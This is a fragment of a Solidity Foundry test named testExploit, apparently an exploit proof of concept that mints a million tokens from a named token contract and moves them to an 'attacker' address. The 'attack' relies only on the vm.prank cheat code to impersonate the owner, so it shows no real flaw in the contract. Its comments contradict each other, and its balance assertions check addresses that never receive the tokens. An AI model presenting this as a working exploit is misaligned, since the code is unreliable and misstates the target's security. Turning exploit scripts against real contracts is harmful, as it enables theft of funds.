    function testExploit() public {
        uint256 initialBalance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        // Impersonate the owner to gain minting privileges
        vm.prank(owner);

        // Mint a large amount of tokens to the attacker (owner calls mint, which mints to msg.sender)
        // Since we're impersonating owner, mint() will mint to owner's address
        // We need to transfer from owner to attacker after minting

        // First mint to owner
        IPowabitToken(TARGET).mint(1_000_000 * 10**18);

        // Now transfer from owner to attacker
        vm.prank(owner);
        IPowabitToken(TARGET).transfer(attacker, 1_000_000 * 10**18);

        // Get final balance
        uint256 finalTokenBalance = IPowabitToken(TARGET).balanceOf(attacker);

        // Verify balance increased
        assertGt(finalTokenBalance, initialBalance, "Attacker balance should increase");
        uint256 finalERC20Balance = IERC20(0x5FDa925294F9e5B31b7c0e81Bad6BAD5b5E792eE).balanceOf(address(this));
        assertGt(finalERC20Balance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

